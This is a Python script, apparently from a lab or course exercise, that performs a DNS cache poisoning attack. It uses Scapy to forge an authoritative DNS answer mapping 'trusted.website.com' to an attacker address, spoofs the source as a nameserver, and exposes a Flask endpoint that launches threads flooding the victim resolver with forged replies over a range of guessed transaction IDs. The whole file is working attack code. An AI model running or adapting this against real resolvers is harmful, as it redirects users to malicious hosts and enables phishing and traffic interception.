from scapy.all import *
from flask import Flask, request
import threading

app = Flask("cache")
src_ip = "2.2.2.5"
mal_ip = "192.168.1.6"
dst_ip = "192.168.1.3"

src_port = 53
dst_port = 6666

website = "trusted.website.com"
dnswebsite ="dnswebsite.website.com"

response = (IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port, sport=src_port)/DNS(id=1, qr=1,
            aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=604769, rdata=mal_ip)))

dns_layer = response[DNS]
s = conf.L3socket()


def attack(start):
	for i in range(start, start + 200, 1):
		dns_layer.id = i % 65000
		s.send(response)
	return 'done'


@app.route('/', methods=['GET'])
def start_attack():
	qid = int(request.args.get('start_qid'))
	for i in range(0, 5, 1):
		threading.Thread(target=attack, args=(qid,)).start()
		qid += 200
	return 'done'


if __name__ == "__main__":
	app.run(host = '0.0.0.0', port = 8888)
